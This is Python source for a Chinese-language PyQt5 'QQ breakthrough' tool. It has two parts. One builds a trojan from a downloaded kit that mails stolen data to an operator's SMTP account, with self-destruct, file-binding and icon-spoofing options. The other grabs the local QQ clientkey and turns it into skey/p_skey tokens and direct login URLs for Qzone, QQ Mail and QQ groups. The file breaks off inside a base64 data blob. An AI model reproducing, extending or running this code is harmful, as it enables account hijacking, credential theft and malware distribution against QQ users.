# -*- coding: utf-8 -*-

from PyQt5 import QtCore, QtGui, QtWidgets
from urlextract import URLExtract
import requests
import re
import json
from threading import Thread
from webbrowser import open as web_open
import hashlib
import os
import subprocess
import zipfile
from time import sleep
import sys
import base64
import dns.resolver
import traceback

def encrypt(fpath: str, algorithm: str) -> str:
    with open(fpath, 'rb') as f:
        return hashlib.new(algorithm, f.read()).hexdigest()

def get_file_path(name):
    if getattr(sys, 'frozen', None):
        basedir = sys._MEIPASS
    else:
        basedir = os.path.dirname(__file__)
    file_path = os.path.join(basedir, name)
    return file_path

def get_g_tk(p_skey):
    t = 5381
    for i in p_skey:
        t += (t << 5) + ord(i)
    return t & 2147483647

class EmittingStream(QtCore.QObject):
    textWritten = QtCore.pyqtSignal(str)  # 定义一个发送str的信号

    def write(self, text):
        self.textWritten.emit(str(text))

    def flush(self):
        pass

class Ui_Dialog(object):
    def setupUi(self, Dialog):
        self.func_running = False
        self.qzone_url = ''
        self.qun_url = ''
        self.mail_url = ''
        self.icon_path = ''
        self.file_path = ''
        Dialog.setObjectName("Dialog")
        Dialog.resize(701, 463)
        font = QtGui.QFont()
        font.setFamily("微软雅黑")
        Dialog.setFont(font)
        Dialog.setWindowFlags(QtCore.Qt.WindowMinimizeButtonHint | QtCore.Qt.WindowCloseButtonHint)
        Dialog.setFixedSize(Dialog.width(), Dialog.height())
        Dialog.setWindowIcon(QtGui.QIcon(get_file_path("./icon.ico")))
        self.centralwidget = QtWidgets.QWidget(Dialog)
        self.centralwidget.setObjectName("centralwidget")
        self.label = QtWidgets.QLabel(Dialog)
        self.label.setGeometry(QtCore.QRect(20, 10, 131, 21))
        font = QtGui.QFont()
        font.setFamily("微软雅黑")
        font.setPointSize(13)
        self.label.setFont(font)
        self.label.setObjectName("label")
        self.label_2 = QtWidgets.QLabel(Dialog)
        self.label_2.setGeometry(QtCore.QRect(40, 90, 91, 21))
        font = QtGui.QFont()
        font.setFamily("微软雅黑")
        font.setPointSize(11)
        self.label_2.setFont(font)
        self.label_2.setObjectName("label_2")
        self.label_3 = QtWidgets.QLabel(Dialog)
        self.label_3.setGeometry(QtCore.QRect(55, 117, 81, 21))
        font = QtGui.QFont()
        font.setFamily("微软雅黑")
        font.setPointSize(11)
        self.label_3.setFont(font)
        self.label_3.setObjectName("label_3")
        self.lineEdit = QtWidgets.QLineEdit(Dialog)
        self.lineEdit.setGeometry(QtCore.QRect(130, 92, 131, 20))
        self.lineEdit.setObjectName("lineEdit")
        self.lineEdit_2 = QtWidgets.QLineEdit(Dialog)
        self.lineEdit_2.setGeometry(QtCore.QRect(130, 120, 41, 20))
        self.lineEdit_2.setObjectName("lineEdit_2")
        self.checkBox = QtWidgets.QCheckBox(Dialog)
        self.checkBox.setGeometry(QtCore.QRect(40, 148, 131, 16))
        font = QtGui.QFont()
        font.setFamily("微软雅黑")
        font.setPointSize(10)
        self.checkBox.setFont(font)
        self.checkBox.setLayoutDirection(QtCore.Qt.LeftToRight)
        self.checkBox.setObjectName("checkBox")
        self.checkBox_2 = QtWidgets.QCheckBox(Dialog)
        self.checkBox_2.setGeometry(QtCore.QRect(180, 146, 101, 21))
        font.setPointSize(10)
        self.checkBox_2.setFont(font)
        self.checkBox_2.setObjectName("checkBox_2")
        self.checkBox_2.clicked.connect(self.if_icon_checkbox_changed)
        font = QtGui.QFont()
        font.setFamily("微软雅黑")
        font.setPointSize(10)
        self.checkBox_3 = QtWidgets.QCheckBox(Dialog)
        self.checkBox_3.setGeometry(QtCore.QRect(180, 125, 101, 16))
        self.checkBox_3.setFont(font)
        self.checkBox_3.clicked.connect(self.if_exe_checkbox_changed)
        self.label_4 = QtWidgets.QLabel(Dialog)
        self.label_4.setGeometry(QtCore.QRect(90, 40, 41, 21))
        font = QtGui.QFont()
        font.setFamily("微软雅黑")
        font.setPointSize(11)
        self.label_4.setFont(font)
        self.label_4.setLayoutDirection(QtCore.Qt.LeftToRight)
        self.label_4.setObjectName("label_4")
        self.lineEdit_3 = QtWidgets.QLineEdit(Dialog)
        self.lineEdit_3.setGeometry(QtCore.QRect(130, 42, 131, 20))
        self.lineEdit_3.setObjectName("lineEdit_3")
        self.pushButton = QtWidgets.QPushButton(Dialog)
        self.pushButton.setGeometry(QtCore.QRect(40, 170, 226, 31))
        self.pushButton.setObjectName("pushButton")
        self.pushButton.clicked.connect(lambda: (self.textEdit.setText(""), Thread(
            target=self.generate_trojan).start()) if not self.func_running else QtWidgets.QMessageBox.critical(Dialog,
                                                                                                           "错误",
                                                                                                           "已有功能正在运行,请等待运行完毕!"))

        self.lineEdit_4 = QtWidgets.QLineEdit(Dialog)
        self.lineEdit_4.setGeometry(QtCore.QRect(130, 67, 131, 20))
        self.lineEdit_4.setObjectName("lineEdit_4")
        self.label_5 = QtWidgets.QLabel(Dialog)
        self.label_5.setGeometry(QtCore.QRect(20, 65, 111, 21))
        font = QtGui.QFont()
        font.setFamily("微软雅黑")
        font.setPointSize(11)
        self.label_5.setFont(font)
        self.label_5.setLayoutDirection(QtCore.Qt.LeftToRight)
        self.label_5.setObjectName("label_5")
        self.textEdit = QtWidgets.QTextEdit(Dialog)
        self.textEdit.setGeometry(QtCore.QRect(10, 230, 682, 221))
        self.textEdit.setReadOnly(True)
        self.textEdit.setObjectName("textEdit")
        self.textEdit.textChanged.connect(lambda: self.textEdit.moveCursor(11))
        self.label_7 = QtWidgets.QLabel(Dialog)
        self.label_7.setGeometry(QtCore.QRect(310, 11, 171, 21))
        font = QtGui.QFont()
        font.setFamily("微软雅黑")
        font.setPointSize(13)
        self.label_7.setFont(font)
        self.label_7.setObjectName("label_7")
        self.label_6 = QtWidgets.QLabel(Dialog)
        self.label_6.setGeometry(QtCore.QRect(0, 210, 301, 16))
        self.label_6.setObjectName("label_6")
        self.label_8 = QtWidgets.QLabel(Dialog)
        self.label_8.setGeometry(QtCore.QRect(330, 93, 101, 21))
        font = QtGui.QFont()
        font.setFamily("微软雅黑")
        font.setPointSize(11)
        self.label_8.setFont(font)
        self.label_8.setObjectName("label_8")
        self.lineEdit_5 = QtWidgets.QLineEdit(Dialog)
        self.lineEdit_5.setGeometry(QtCore.QRect(410, 70, 131, 20))
        self.lineEdit_5.setObjectName("lineEdit_5")
        self.lineEdit_6 = QtWidgets.QLineEdit(Dialog)
        self.lineEdit_6.setGeometry(QtCore.QRect(410, 45, 131, 20))
        self.lineEdit_6.setObjectName("lineEdit_6")
        self.label_9 = QtWidgets.QLabel(Dialog)
        self.label_9.setGeometry(QtCore.QRect(369, 43, 51, 21))
        font = QtGui.QFont()
        font.setFamily("微软雅黑")
        font.setPointSize(11)
        self.label_9.setFont(font)
        self.label_9.setLayoutDirection(QtCore.Qt.LeftToRight)
        self.label_9.setObjectName("label_9")
        self.label_10 = QtWidgets.QLabel(Dialog)
        self.label_10.setGeometry(QtCore.QRect(360, 68, 81, 21))
        font = QtGui.QFont()
        font.setFamily("微软雅黑")
        font.setPointSize(11)
        self.label_10.setFont(font)
        self.label_10.setLayoutDirection(QtCore.Qt.LeftToRight)
        self.label_10.setObjectName("label_10")
        self.lineEdit_7 = QtWidgets.QLineEdit(Dialog)
        self.lineEdit_7.setGeometry(QtCore.QRect(410, 95, 131, 20))
        self.lineEdit_7.setObjectName("lineEdit_7")
        self.label_11 = QtWidgets.QLabel(Dialog)
        self.label_11.setGeometry(QtCore.QRect(310, 119, 101, 21))
        font = QtGui.QFont()
        font.setFamily("微软雅黑")
        font.setPointSize(11)
        self.label_11.setFont(font)
        self.label_11.setObjectName("label_11")
        self.lineEdit_8 = QtWidgets.QLineEdit(Dialog)
        self.lineEdit_8.setGeometry(QtCore.QRect(410, 121, 131, 20))
        self.lineEdit_8.setObjectName("lineEdit_8")
        self.pushButton_2 = QtWidgets.QPushButton(Dialog)
        self.pushButton_2.setGeometry(QtCore.QRect(320, 172, 221, 31))
        self.pushButton_2.setObjectName("pushButton_2")
        self.pushButton_2.clicked.connect(lambda: (self.textEdit.setText(""), Thread(
            target=self.get_qq_info).start()) if not self.func_running else QtWidgets.QMessageBox.critical(Dialog,
                                                                                                           "错误",
                                                                                                           "已有功能正在运行,请等待运行完毕!"))
        self.label_12 = QtWidgets.QLabel(Dialog)
        self.label_12.setGeometry(QtCore.QRect(310, 144, 101, 21))
        font = QtGui.QFont()
        font.setFamily("微软雅黑")
        font.setPointSize(11)
        self.label_12.setFont(font)
        self.label_12.setObjectName("label_12")
        self.lineEdit_9 = QtWidgets.QLineEdit(Dialog)
        self.lineEdit_9.setGeometry(QtCore.QRect(410, 145, 131, 20))
        self.lineEdit_9.setObjectName("lineEdit_9")
        self.label_13 = QtWidgets.QLabel(Dialog)
        self.label_13.setGeometry(QtCore.QRect(300, 210, 450, 16))
        self.label_13.setObjectName("label_13")
        self.label_14 = QtWidgets.QLabel(Dialog)
        self.label_14.setGeometry(QtCore.QRect(290, 0, 16, 221))
        self.label_14.setObjectName("label_14")
        self.pushButton_3 = QtWidgets.QPushButton(Dialog)
        self.pushButton_3.setGeometry(QtCore.QRect(550, 45, 141, 41))
        self.pushButton_3.setObjectName("pushButton_3")
        self.pushButton_3.clicked.connect(lambda :web_open(self.qzone_url))
        self.pushButton_5 = QtWidgets.QPushButton(Dialog)
        self.pushButton_5.setGeometry(QtCore.QRect(550, 95, 141, 41))
        self.pushButton_5.setObjectName("pushButton_5")
        self.pushButton_5.clicked.connect(lambda: web_open(self.mail_url))
        self.pushButton_6 = QtWidgets.QPushButton(Dialog)
        self.pushButton_6.setGeometry(QtCore.QRect(550, 145, 141, 41))
        self.pushButton_6.setObjectName("pushButton_6")
        self.pushButton_6.clicked.connect(lambda: web_open(self.qun_url))
        self.retranslateUi(Dialog)
        QtCore.QMetaObject.connectSlotsByName(Dialog)
        self.output_signal = EmittingStream()
        self.output_signal.textWritten.connect(self.change_textedit)
        self.textEdit.setText("Tips: 木马生成如果不知道smtp服务器可留空,将自动获取")

    def retranslateUi(self, Dialog):
        _translate = QtCore.QCoreApplication.translate
        Dialog.setWindowTitle(_translate("Dialog", "QQ突破专区"))
        self.label.setText(_translate("Dialog",
                                      "<html><head/><body><p><span style=\" color:#ff0000;\">木马专区:</span></p></body></html>"))
        self.label_2.setText(_translate("Dialog", "smtp服务器:"))
        self.label_3.setText(_translate("Dialog", "smtp端口:"))
        self.lineEdit_2.setText(_translate("Dialog", "25"))
        self.checkBox.setText(_translate("Dialog", "是否运行后自毁"))
        self.checkBox_2.setText(_translate("Dialog", "自定义图标"))
        self.label_4.setText(_translate("Dialog", "邮箱:"))
        self.pushButton.setText(_translate("Dialog", "开始生成"))
        self.label_5.setText(_translate("Dialog", "<html><head/><body><p>密码(或授权码):</p></body></html>"))
        self.label_7.setText(_translate("Dialog",
                                        "<html><head/><body><p><span style=\" color:#ff0000;\">QQ本地信息获取:</span></p></body></html>"))
        self.label_6.setText(_translate("Dialog", "---------------------------------------------------------------"))
        self.label_9.setText("昵称:")
        self.label_11.setText(_translate("Dialog", "<html><head/><body><p>空间登录地址:</p></body></html>"))
        self.label_10.setText(_translate("Dialog", "<html><head/><body><p>QQ号:</p></body></html>"))
        self.label_8.setText(_translate("Dialog", "<html><head/><body><p>ClientKey:</p></body></html>"))
        self.label_12.setText(_translate("Dialog", "<html><head/><body><p>邮箱登录地址:</p></body></html>"))
        self.pushButton_2.setText(_translate("Dialog", "获取信息"))
        self.label_13.setText(_translate("Dialog", "------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"))
        self.label_14.setText(_translate("Dialog",
                                         "<html><head/><body><p>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/></p></body></html>"))
        self.pushButton_3.setText(_translate("Dialog", "QQ空间"))
        self.pushButton_5.setText(_translate("Dialog", "QQ邮箱"))
        self.pushButton_6.setText(_translate("Dialog", "QQ群"))
        self.checkBox_3.setText(_translate("Dialog", "捆绑文件"))
    def change_textedit(self, message: str):
        self.textEdit.setText(self.textEdit.toPlainText() + message)

    def find_smtp_server(self,email_address):
        data = {
            "163.com": "smtp.163.com",
            "126.com": "smtp.126.com",
            "qq.com": "smtp.qq.com",
            "outlook.com": "smtp-mail.outlook.com",
            "gmail.com": "smtp.gmail.com",
            "hotmail.com": "smtp.live.com",
            "yahoo.com": "smtp.mail.yahoo.com",
            "live.com": "smtp.live.com",
            "foxmail.com": "smtp.foxmail.com",
            "sina.com": "smtp.sina.com",
            "sohu.com": "smtp.sohu.com",
            "139.com": "smtp.139.com",
            "189.com": "smtp.189.com",
            "21cn.com": "smtp.21cn.com",
            "aliyun.com": "smtp.aliyun.com",
            "263.net": "smtp.263.net",
            "yeah.net": "smtp.yeah.net",
            "netease.com": "smtp.163.com",
        }
        url = email_address.split("@")[-1][:-1]
        smtp_server = data.get(url)
        if not smtp_server:
            try:
                answer = dns.resolver.resolve(url, "MX", raise_on_no_answer=False)
                smtp_server = list(answer)[-1].exchange.to_text()
                if "netease" in smtp_server:
                    smtp_server = "smtp.qiye.163.com"
                elif "mxhichina" in smtp_server:
                    smtp_server = "smtp.mxhichina.com"
                elif "qq" in smtp_server:
                    smtp_server = "smtp.exmail.qq.com"
                else:
                    smtp_server = None
            except Exception as e:
                print(repr(e))
                smtp_server = None
        return f'"{smtp_server}"' if smtp_server else None

    def if_icon_checkbox_changed(self):
        if self.checkBox_2.isChecked():
            self.icon_path = QtWidgets.QFileDialog.getOpenFileName(self.centralwidget, "选择图标", "", "图片文件(*.ico *.png *.jpg)")[0]
            if not self.icon_path:
                self.checkBox_2.setChecked(False)
        else:
            self.icon_path = ""

    def if_exe_checkbox_changed(self):
        if self.checkBox_3.isChecked():
            choice = QtWidgets.QMessageBox.question(self.centralwidget, "询问", "请问是否需要将图标更改为文件的图标(仅exe可获取)?")
            if choice == QtWidgets.QMessageBox.Yes and self.icon_path:
                if QtWidgets.QMessageBox.question(self.centralwidget, "询问", "检测到您已选择图标,请问是否覆盖原先图标?") == QtWidgets.QMessageBox.No:
                    choice = QtWidgets.QMessageBox.No
            self.file_path = QtWidgets.QFileDialog.getOpenFileName(self.centralwidget, "选择文件", "", "所有文件(*)")[0]
            file_format = os.path.splitext(self.file_path)[1]
            if not self.file_path:
                self.checkBox_3.setChecked(False)
                return
            for i in self.file_path:
                if i == ' ':
                    QtWidgets.QMessageBox.critical(self.centralwidget, "错误", "路径/文件名内不应包含空格,请将文件移至纯英文数字无空格的文件夹内!")
                    self.checkBox_3.setChecked(False)
                    self.file_path = ""
                    return
            if choice == QtWidgets.QMessageBox.Yes and file_format == ".exe":
                self.icon_path = self.file_path
                self.checkBox_2.setChecked(True)
            elif choice == QtWidgets.QMessageBox.Yes:
                QtWidgets.QMessageBox.critical(self.centralwidget, "错误", "提取文件图标仅支持exe文件!")
        else:
            self.file_path = ""

    def get_qq_info(self):
        self.func_running = True
        sys.stdout = self.output_signal
        print("[Info] 欢迎使用 QQ Clientkey 获取器!")
        print("[Warning] 请勿将本窗口任何信息透露给他人,否则后果自行承担!")
        print("[Tip] 在刚登录QQ时获取可能会出现如无法获取skey的情况,这时请重启工具获取!")
        session = requests.session()
        try:
            print("[Info] 正在获取pt_local_token...")
            login_htm = session.get(
                "https://xui.ptlogin2.qq.com/cgi-bin/xlogin?s_url=https://qzs.qq.com/qzone/v5/loginsucc.html?para=izone")
            q_cookies = requests.utils.dict_from_cookiejar(login_htm.cookies)
            pt_local_token = q_cookies.get("pt_local_token")
            pt_login_sig = q_cookies.get("pt_login_sig")
            print(f"[+] pt_local_token={pt_local_token}\n[+] pt_local_sig={pt_login_sig}")
            params = {"callback": "ptui_getuins_CB",
                      "r": "0.8987470931280881",
                      "pt_local_tk": pt_local_token}
            cookies = {"pt_local_token": pt_local_token,
                       "pt_login_sig": pt_login_sig}
            headers = {"Referer": "https://xui.ptlogin2.qq.com/",
                       "Host": "localhost.ptlogin2.qq.com:4301",
                       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"}
        except Exception as e:
            print(f"[ERROR] 获取pt_local_token时发生错误,原因:{e}")
            self.func_running = False
            return
        try:
            print("[Info] 正在获取本机登录QQ号..")
            get_uin = session.get("https://localhost.ptlogin2.qq.com:4301/pt_get_uins", params=params, cookies=cookies,
                                  headers=headers).text
            uin_list = re.findall(r'\[([^\[\]]*)\]', get_uin)[0]
            split_list = list(map(lambda i: i if i[0] == '{' else '{' + i, uin_list.split(',{')))
            uin = None
            nickname = None
            if len(split_list) > 1:
                print("[Info] 检测到您正在多开QQ,将使用第一个QQ号获取")
                uin_list = json.loads(json.loads(json.dumps(split_list[0])))  # Json库我爱你loads后返回str还要再loads一次 凸(艹皿艹 )
                uin = uin_list.get("uin")
                nickname = uin_list.get("nickname")
            else:
                uin = json.loads(uin_list).get('uin')
                nickname = json.loads(uin_list).get('nickname')
            print(f"[+] uin={uin}\n[+] nickname={nickname}")
            clientkey_params = {"clientuin": uin,
                                "r": "0.14246048393632815",
                                "pt_local_tk": pt_local_token,
                                "callback": "__jp0"}
            print("[Info] 正在获取clientkey...")
            clientkey_get = session.get("https://localhost.ptlogin2.qq.com:4301/pt_get_st", cookies=cookies,
                                        headers=headers, params=clientkey_params)
            clientkey_cookies = requests.utils.dict_from_cookiejar(clientkey_get.cookies)
            clientkey = clientkey_cookies.get("clientkey")
            if not clientkey:
                print(f"""******************信息整理******************
[Warning]未获取到clientkey,说明您的QQ还未生成clientkey,请尝试稍等30~60秒后重启工具获取!
uin={uin}
nickname={nickname}
******************感谢使用******************""")
            else:
                print(f"[+] clientkey={clientkey}")
        except requests.exceptions.ConnectionError as e:
            if "10054" in e.__str__(): # 10054则代表远程主机强迫关闭了一个现有的连接,即不支持(对应版本9.7.2x)
                print(f"[ERROR] 连接失败,请检查您的QQ版本是否为9.7.2x/4301端口是否被占用,若是则说明无法使用!")
            elif "10061" in e.__str__(): # 10061则代表端口未开放
                print(f"[ERROR] 连接失败,请检查是否开启QQ!")
            else:
                print(f"[ERROR] 连接失败,原因:\n{e}")
            self.func_running = False
            return
        except Exception as e:
            print(f"[ERROR] 获取clientkey发生错误,原因:\n{traceback.format_exc()}{'-'*32}\n请尝试在主界面提交反馈至作者!")
            self.func_running = False
            return
        try:
            print("[Info] 正在获取QQ空间&QQ邮箱登录地址&Skey...")
            qzone_params = {
                "u1": "https://qzs.qq.com/qzone/v5/loginsucc.html?para=izone",
                "clientuin": uin,
                "pt_aid": "549000912",
                "keyindex": "19",
                "pt_local_tk": pt_local_token,
                "pt_3rd_aid": "0",
                "ptopt": "1",
                "style": "40",
                "daid": "5"
            }
            headers = {"Referer": "https://xui.ptlogin2.qq.com/",
                       "Host": "ssl.ptlogin2.qq.com",
                       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"}
            qzone_url = session.get("https://ssl.ptlogin2.qq.com/jump", params=qzone_params, cookies=cookies,
                                    headers=headers)
            qzone_cookies = requests.utils.dict_from_cookiejar(qzone_url.cookies)
            qzone_skey = qzone_cookies.get("skey")
            extractor = URLExtract()
            qzone_url = extractor.find_urls(qzone_url.text)[0]
            pskey = session.get(qzone_url, allow_redirects=False)
            pskey_cookies = requests.utils.dict_from_cookiejar(pskey.cookies)
            qzone_pskey = pskey_cookies.get("p_skey")
            qzone_url = f"https://ssl.ptlogin2.qq.com/jump?ptlang=1033&clientuin={uin}&clientkey={clientkey}&u1=https://user.qzone.qq.com/{uin}/infocenter&keyindex=19"
            print(f"[+] qzone_skey={qzone_skey}")
            print(f"[+] qzone_pskey={qzone_pskey}")
            print(f"[+] qzone_url={qzone_url}")
            mail_params = {
                "u1": "https://graph.qq.com/oauth2.0/login_jump",
                "clientuin": uin,
                "pt_aid": "716027609",
                "keyindex": "19",
                "pt_local_tk": pt_local_token,
                "pt_3rd_aid": "102013353",
                "ptopt": "1",
                "style": "40",
                "daid": "383"
            }
            mail_cookies = {
                "clientkey": str(clientkey),
                "clientuin": str(uin),
                "pt_local_token": str(pt_local_token),
                "pt_login_sig": str(pt_login_sig)
            }
            mail_url = session.get("https://ssl.ptlogin2.qq.com/jump", params=mail_params, cookies=mail_cookies,
                                   headers=headers)
            mail_cookies = requests.utils.dict_from_cookiejar(mail_url.cookies)
            mail_url = extractor.find_urls(mail_url.text)[0]
            pskey = session.get(mail_url, allow_redirects=False)
            pskey_cookies = requests.utils.dict_from_cookiejar(pskey.cookies)
            mail_pskey = pskey_cookies.get("p_skey")
            mail_url = f"https://ssl.ptlogin2.qq.com/jump?ptlang=1033&clientuin={uin}&clientkey={clientkey}&u1=https://wx.mail.qq.com/list/readtemplate?name=login_page.html&keyindex=19"
            print(f"[+] mail_pskey={mail_pskey}")
            print(f"[+] mail_url={mail_url}")
            qun_params = {
                "clientuin": str(uin),
                "keyindex": "19",
                "pt_aid": "715030901",
                "daid": "73",
                "u1": "https://qun.qq.com/",
                "pt_local_tk": str(pt_local_token),
                "pt_3rd_aid": "0",
                "ptopt": "1",
                "style": "40"
            }
            qun_cookies = {
                "clientkey": str(clientkey),
                "clientuin": str(uin),
                "pt_local_token": str(pt_local_token),
                "pt_login_sig": str(pt_login_sig)
            }
            qun_res = session.get("https://ssl.ptlogin2.qq.com/jump", params=qun_params, cookies=qun_cookies,
                                  headers=headers)
            qun_url = extractor.find_urls(qun_res.text)[0]
            qun_cookie = requests.utils.dict_from_cookiejar(qun_res.cookies)
            qun_info_cookies = session.get(qun_url, allow_redirects=False).cookies
            qun_skey = qun_info_cookies.get("skey")
            qun_pskey = qun_info_cookies.get("p_skey")
            print(f"[+] qun_url={qun_url}")
        except Exception as e:
            print(f"[ERROR] 获取QQ空间&QQ邮箱地址时出现错误,原因:{e}")
            self.func_running = False
            return
        print("******************信息整理******************")
        print(f"uin={uin}")
        print(f"nickname={nickname}")
        print(f"clientkey={clientkey}")
        print(f"qzone_skey={qzone_skey}")
        print(f"qzone_pskey={qzone_pskey}")
        print(f"mail_pskey={mail_pskey}")
        print(f"qun_skey={qun_skey}")
        print(f"qun_pskey={qun_pskey}")

        print(f"qzone_url={qzone_url}")

        print(f"mail_url={mail_url}")

        print(f"qun_url={qun_url}")
        print("******************感谢使用******************",end='')
        self.lineEdit_6.setText(nickname)
        self.lineEdit_5.setText(str(uin))
        self.lineEdit_7.setText(clientkey)
        self.lineEdit_8.setText(qzone_url)
        self.lineEdit_9.setText(mail_url)
        self.qzone_url = qzone_url
        self.qun_url = qun_url
        self.mail_url = mail_url
        self.func_running = False
        sys.stdout = sys.__stdout__
        print(self.icon_path)

    def generate_trojan(self, reset_icon_path=False):
        sys.stdout = self.output_signal
        self.func_running = True
        try:
            if not os.path.isfile("Tools.zip"):
                print("未检测到搭建包,请重新打开工具下载搭建包!")
                sys.stdout = sys.__stdout__
                self.func_running = False
                return
            sleep(1)
            print("正在验证文件完整性...")
            if encrypt('Tools.zip', 'md5') == 'ba44b872e7d53f5c7dfb1da1c0d114a2':
                pass
            elif encrypt('Tools.zip', 'md5') in ['65e83fcb0f3a0f6729d24a24794eefb5','1dc8bc2b6fef8a0933f15c419f9ef99e']:
                print("失败,检测到您正在使用旧版搭建包,请删除现有搭建包重新打开工具下载新版搭建包!")
                sys.stdout = sys.__stdout__
                self.func_running = False
                return
            else:
                print("失败,请删除文件打开工具下载搭建文件!")
                sys.stdout = sys.__stdout__
                self.func_running = False
                return
            print("正在释放文件...")
            with open("tlds-alpha-by-domain.txt", 'wb') as f:
                f.write(base64.b64decode(
                    "IyBWZXJzaW9uIDIwMjQwNDE3MDAsIExhc3QgVXBkYXRlZCBXZWQgQXByIDE3IDA3OjA3OjAxIDIwMjQgVVRDCkFBQQpBQVJQCkFCQgpBQkJPVFQKQUJCVklFCkFCQwpBQkxFCkFCT0dBRE8KQUJVREhBQkkKQUMKQUNBREVNWQpBQ0NFTlRVUkUKQUNDT1VOVEFOVApBQ0NPVU5UQU5UUwpBQ08KQUNUT1IKQUQKQURTCkFEVUxUCkFFCkFFRwpBRVJPCkFFVE5BCkFGCkFGTApBRlJJQ0EKQUcKQUdBS0hBTgpBR0VOQ1kKQUkKQUlHCkFJUkJVUwpBSVJGT1JDRQpBSVJURUwKQUtETgpBTApBTElCQUJBCkFMSVBBWQpBTExGSU5BTloKQUxMU1RBVEUKQUxMWQpBTFNBQ0UKQUxTVE9NCkFNCkFNQVpPTgpBTUVSSUNBTkVYUFJFU1MKQU1FUklDQU5GQU1JTFkKQU1FWApBTUZBTQpBTUlDQQpBTVNURVJEQU0KQU5BTFlUSUNTCkFORFJPSUQKQU5RVUFOCkFOWgpBTwpBT0wKQVBBUlRNRU5UUwpBUFAKQVBQTEUKQVEKQVFVQVJFTExFCkFSCkFSQUIKQVJBTUNPCkFSQ0hJCkFSTVkKQVJQQQpBUlQKQVJURQpBUwpBU0RBCkFTSUEKQVNTT0NJQVRFUwpBVApBVEhMRVRBCkFUVE9STkVZCkFVCkFVQ1RJT04KQVVESQpBVURJQkxFCkFVRElPCkFVU1BPU1QKQVVUSE9SCkFVVE8KQVVUT1MKQVcKQVdTCkFYCkFYQQpBWgpBWlVSRQpCQQpCQUJZCkJBSURVCkJBTkFNRVgKQkFORApCQU5LCkJBUgpCQVJDRUxPTkEKQkFSQ0xBWUNBUkQKQkFSQ0xBWVMKQkFSRUZPT1QKQkFSR0FJTlMKQkFTRUJBTEwKQkFTS0VUQkFMTApCQVVIQVVTCkJBWUVSTgpCQgpCQkMKQkJUCkJCVkEKQkNHCkJDTgpCRApCRQpCRUFUUwpCRUFVVFkKQkVFUgpCRU5UTEVZCkJFUkxJTgpCRVNUCkJFU1RCVVkKQkVUCkJGCkJHCkJICkJIQVJUSQpCSQpCSUJMRQpCSUQKQklLRQpCSU5HCkJJTkdPCkJJTwpCSVoKQkoKQkxBQ0sKQkxBQ0tGUklEQVkKQkxPQ0tCVVNURVIKQkxPRwpCTE9PTUJFUkcKQkxVRQpCTQpCTVMKQk1XCkJOCkJOUFBBUklCQVMKQk8KQk9BVFMKQk9FSFJJTkdFUgpCT0ZBCkJPTQpCT05ECkJPTwpCT09LCkJPT0tJTkcKQk9TQ0gKQk9TVElLCkJPU1RPTgpCT1QKQk9VVElRVUUKQk9YCkJSCkJSQURFU0NPCkJSSURHRVNUT05FCkJST0FEV0FZCkJST0tFUgpCUk9USEVSCkJSVVNTRUxTCkJTCkJUCkJVSUxECkJVSUxERVJTCkJVU0lORVNTCkJVWQpCVVpaCkJWCkJXCkJZCkJaCkJaSApDQQpDQUIKQ0FGRQpDQUwKQ0FMTApDQUxWSU5LTEVJTgpDQU0KQ0FNRVJBCkNBTVAKQ0FOT04KQ0FQRVRPV04KQ0FQSVRBTApDQVBJVEFMT05FCkNBUgpDQVJBVkFOCkNBUkRTCkNBUkUKQ0FSRUVSCkNBUkVFUlMKQ0FSUwpDQVNBCkNBU0UKQ0FTSApDQVNJTk8KQ0FUCkNBVEVSSU5HCkNBVEhPTElDCkNCQQpDQk4KQ0JSRQpDQwpDRApDRU5URVIKQ0VPCkNFUk4KQ0YKQ0ZBCkNGRApDRwpDSApDSEFORUwKQ0hBTk5FTApDSEFSSVRZCkNIQVNFCkNIQVQKQ0hFQVAKQ0hJTlRBSQpDSFJJU1RNQVMKQ0hST01FCkNIVVJDSApDSQpDSVBSSUFOSQpDSVJDTEUKQ0lTQ08KQ0lUQURFTApDSVRJCkNJVElDCkNJVFkKQ0sKQ0wKQ0xBSU1TCkNMRUFOSU5HCkNMSUNLCkNMSU5JQwpDTElOSVFVRQpDTE9USElORwpDTE9VRApDTFVCCkNMVUJNRUQKQ00KQ04KQ08KQ09BQ0gKQ09ERVMKQ09GRkVFCkNPTExFR0UKQ09MT0dORQpDT00KQ09NTUJBTksKQ09NTVVOSVRZCkNPTVBBTlkKQ09NUEFSRQpDT01QVVRFUgpDT01TRUMKQ09ORE9TCkNPTlNUUlVDVElPTgpDT05TVUxUSU5HCkNPTlRBQ1QKQ09OVFJBQ1RPUlMKQ09PS0lORwpDT09MCkNPT1AKQ09SU0lDQQpDT1VOVFJZCkNPVVBPTgpDT1VQT05TCkNPVVJTRVMKQ1BBCkNSCkNSRURJVApDUkVESVRDQVJECkNSRURJVFVOSU9OCkNSSUNLRVQKQ1JPV04KQ1JTCkNSVUlTRQpDUlVJU0VTCkNVCkNVSVNJTkVMTEEKQ1YKQ1cKQ1gKQ1kKQ1lNUlUKQ1lPVQpDWgpEQUJVUgpEQUQKREFOQ0UKREFUQQpEQVRFCkRBVElORwpEQVRTVU4KREFZCkRDTEsKRERTCkRFCkRFQUwKREVBTEVSCkRFQUxTCkRFR1JFRQpERUxJVkVSWQpERUxMCkRFTE9JVFRFCkRFTFRBCkRFTU9DUkFUCkRFTlRBTApERU5USVNUCkRFU0kKREVTSUdOCkRFVgpESEwKRElBTU9ORFMKRElFVApESUdJVEFMCkRJUkVDVApESVJFQ1RPUlkKRElTQ09VTlQKRElTQ09WRVIKRElTSApESVkKREoKREsKRE0KRE5QCkRPCkRPQ1MKRE9DVE9SCkRPRwpET01BSU5TCkRPVApET1dOTE9BRApEUklWRQpEVFYKRFVCQUkKRFVOTE9QCkRVUE9OVApEVVJCQU4KRFZBRwpEVlIKRFoKRUFSVEgKRUFUCkVDCkVDTwpFREVLQQpFRFUKRURVQ0FUSU9OCkVFCkVHCkVNQUlMCkVNRVJDSwpFTkVSR1kKRU5HSU5FRVIKRU5HSU5FRVJJTkcKRU5URVJQUklTRVMK